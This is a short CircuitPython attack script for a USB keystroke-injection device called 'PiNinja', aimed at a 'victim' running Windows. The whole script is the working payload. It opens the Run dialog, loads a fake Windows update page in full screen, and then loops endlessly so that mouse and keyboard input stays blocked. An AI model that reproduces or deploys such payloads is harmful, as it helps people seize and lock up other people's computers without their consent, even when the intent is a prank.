#PiNinja Payload Script
#Title: Fake Update
#Description: Causes a Fake Update to appear on victims computer (ONLY WORKS ON WINDOWS)

#Imports
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.mouse import Mouse
from adafruit_hid.keycode import Keycode as key
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from time import sleep
#Varibales
kbd = Keyboard(usb_hid.devices)
lay = KeyboardLayoutUS(kbd)
mse = Mouse(usb_hid.devices)

def main():
    sleep(1)
    kbd.send(key.GUI, key.R)
    sleep(0.3)
    lay.write('https://fakeupdate.net/win10ue/ ')
    enter()
    sleep(0.1)
    kbd.send(key.F11)
    
    blockInput()
    
    
    
    
def enter():
    kbd.send(key.ENTER)
    
def blockInput():
    screen_width = 1920
    screen_height = 1080
     
    while True:
        mse.move(x=int(screen_width / 2), y=int(screen_height / 2))
        kbd.release_all()
